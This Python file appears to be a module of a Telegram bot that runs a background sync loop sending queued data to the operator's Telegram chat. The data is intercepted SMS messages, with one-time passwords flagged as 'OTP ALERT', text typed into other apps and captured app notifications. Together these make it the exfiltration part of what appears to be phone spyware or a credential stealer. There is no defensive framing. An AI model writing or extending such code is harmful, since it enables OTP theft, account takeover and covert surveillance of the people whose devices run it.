import logging
import threading
import time
from datetime import datetime
from bot.database.db_manager import db
from bot.utils.priority_queue import priority_queue
from bot.utils.delivery_tracker import delivery_tracker
from bot.config import QUEUE_SYNC_INTERVAL, BOT_TOKEN, OWNER_ID
import requests

logger = logging.getLogger(__name__)

# ─────────────────────────────────────────
# QUEUE MANAGER CLASS
# ─────────────────────────────────────────
class QueueManager:
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.owner_id = OWNER_ID
        self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
        self.sync_interval = QUEUE_SYNC_INTERVAL
        self._running = False
        self._thread = None

    # ─────────────────────────────────────────
    # SEND MESSAGE TO TELEGRAM
    # ─────────────────────────────────────────
    def _send_to_telegram(self, chat_id, message: str) -> bool:
        try:
            url = f"{self.base_url}/sendMessage"
            payload = {
                "chat_id": chat_id,
                "text": message,
                "parse_mode": "HTML"
            }
            response = requests.post(url, json=payload, timeout=10)
            return response.status_code == 200
        except Exception as e:
            logger.error(f"Queue manager send error: {e}")
            return False

    # ─────────────────────────────────────────
    # CHECK INTERNET CONNECTIVITY
    # ─────────────────────────────────────────
    def _is_online(self) -> bool:
        try:
            requests.get("https://api.telegram.org", timeout=5)
            return True
        except Exception:
            return False

    # ─────────────────────────────────────────
    # PROCESS SMS QUEUE
    # ─────────────────────────────────────────
    def _process_sms_queue(self):
        try:
            sms_batch = priority_queue.get_next_sms_batch()
            for sms in sms_batch:
                try:
                    is_otp = sms.get("is_priority", 1) == 2
                    priority_tag = "⚡ OTP ALERT" if is_otp else "📱 Queued SMS"
                    message = (
                        f"{priority_tag} [SYNCED]\n"
                        f"━━━━━━━━━━━━━━━━\n"
                        f"👤 From: <b>{sms['sender']}</b>\n"
                        f"💬 Message:\n{sms['message']}\n"
                        f"━━━━━━━━━━━━━━━━\n"
                        f"🕐 Time: {sms['timestamp']}\n"
                        f"🔄 Synced: {datetime.now().strftime('%H:%M:%S')}\n"
                    )
                    success = self._send_to_telegram(self.owner_id, message)
                    if success:
                        priority_queue.mark_sms_delivered(sms["sms_id"])
                        logger.info(f"Queued SMS synced: {sms['sms_id']}")
                    else:
                        priority_queue.mark_sms_retry(sms["sms_id"])
                except Exception as e:
                    logger.error(f"Process queued SMS error: {e}")
        except Exception as e:
            logger.error(f"Process SMS queue error: {e}")

    # ─────────────────────────────────────────
    # PROCESS VIEWER QUEUE
    # ─────────────────────────────────────────
    def _process_viewer_queue(self):
        try:
            viewer_queue = db.get_viewer_queue()
            for item in viewer_queue:
                try:
                    message = (
                        f"👁 Input Viewer [SYNCED]\n"
                        f"━━━━━━━━━━━━━━━━\n"
                        f"📲 App: <b>{item['app_name']}</b>\n"
                        f"✏️ Input: {item['input_text']}\n"
                        f"━━━━━━━━━━━━━━━━\n"
                        f"🕐 Time: {item['timestamp']}\n"
                        f"🔄 Synced: {datetime.now().strftime('%H:%M:%S')}\n"
                    )
                    success = self._send_to_telegram(self.owner_id, message)
                    if success:
                        db.remove_from_viewer_queue(item["id"])
                        logger.info(f"Viewer log synced: {item['id']}")
                except Exception as e:
                    logger.error(f"Process queued viewer log error: {e}")
        except Exception as e:
            logger.error(f"Process viewer queue error: {e}")

    # ─────────────────────────────────────────
    # PROCESS NOTIFICATION QUEUE
    # ─────────────────────────────────────────
    def _process_notification_queue(self):
        try:
            notif_queue = db.get_notification_queue()
            for item in notif_queue:
                try:
                    message = (
                        f"🔔 Notification [SYNCED]\n"
                        f"━━━━━━━━━━━━━━━━\n"
                        f"📲 App: <b>{item['app_name']}</b>\n"
                        f"📌 Title: {item['title']}\n"
                        f"💬 Content: {item['content']}\n"
                        f"━━━━━━━━━━━━━━━━\n"
                        f"🕐 Time: {item['timestamp']}\n"
                        f"🔄 Synced: {datetime.now().strftime('%H:%M:%S')}\n"
                    )
                    success = self._send_to_telegram(self.owner_id, message)
                    if success:
                        db.remove_from_notification_queue(item["notif_id"])
                        logger.info(f"Notification synced: {item['notif_id']}")
                except Exception as e:
                    logger.error(f"Process queued notification error: {e}")
        except Exception as e:
            logger.error(f"Process notification queue error: {e}")

    # ─────────────────────────────────────────
    # SYNC ALL QUEUES
    # ─────────────────────────────────────────
    def sync_all_queues(self) -> dict:
        try:
            if not self._is_online():
                logger.info("Offline — sync skipped")
                return {"success": False, "reason": "offline"}

            self._process_sms_queue()
            self._process_viewer_queue()
            self._process_notification_queue()

            status = priority_queue.get_queue_status()
            logger.info(f"Sync complete — Queue status: {status}")
            return {"success": True, "status": status}
        except Exception as e:
            logger.error(f"Sync all queues error: {e}")
            return {"success": False, "reason": str(e)}

    # ─────────────────────────────────────────
    # START AUTO SYNC BACKGROUND THREAD
    # ─────────────────────────────────────────
    def start_auto_sync(self):
        try:
            if self._running:
                logger.info("Auto sync already running")
                return
            self._running = True
            self._thread = threading.Thread(
                target=self._auto_sync_loop,
                daemon=True,
                name="QueueSyncThread"
            )
            self._thread.start()
            logger.info(f"Auto sync started — interval: {self.sync_interval}s")
        except Exception as e:
            logger.error(f"Start auto sync error: {e}")

    # ─────────────────────────────────────────
    # STOP AUTO SYNC
    # ─────────────────────────────────────────
    def stop_auto_sync(self):
        try:
            self._running = False
            logger.info("Auto sync stopped")
        except Exception as e:
            logger.error(f"Stop auto sync error: {e}")

    # ─────────────────────────────────────────
    # AUTO SYNC LOOP
    # ─────────────────────────────────────────
    def _auto_sync_loop(self):
        while self._running:
            try:
                self.sync_all_queues()
            except Exception as e:
                logger.error(f"Auto sync loop error: {e}")
            time.sleep(self.sync_interval)

    # ─────────────────────────────────────────
    # GET QUEUE STATUS
    # ─────────────────────────────────────────
    def get_status(self) -> dict:
        try:
            return priority_queue.get_queue_status()
        except Exception as e:
            logger.error(f"Get queue status error: {e}")
            return {}

    # ─────────────────────────────────────────
    # CLEAR ALL QUEUES
    # ─────────────────────────────────────────
    def clear_all(self) -> bool:
        try:
            return priority_queue.clear_all_queues()
        except Exception as e:
            logger.error(f"Clear all queues error: {e}")
            return False


# ─────────────────────────────────────────
# SINGLETON INSTANCE
# ─────────────────────────────────────────
queue_manager = QueueManager()
